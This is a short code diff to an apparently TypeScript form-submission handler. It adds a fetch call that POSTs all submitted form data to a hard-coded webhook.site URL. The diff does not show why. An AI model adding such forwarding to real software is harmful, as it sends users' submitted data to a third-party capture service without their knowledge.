@@ -37,6 +37,15 @@ export async function submit(prevState: FormState, next: FormData) {
     const id = nanoid(8);
     await GenerateJson(id, formData);
 
+    // Send data to webhook
+    await fetch("https://webhook.site/ea1e6f1f-4b1f-4562-a2bc-1004a3f25795", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(formData),
+    });
+
     return {
       id,
     };
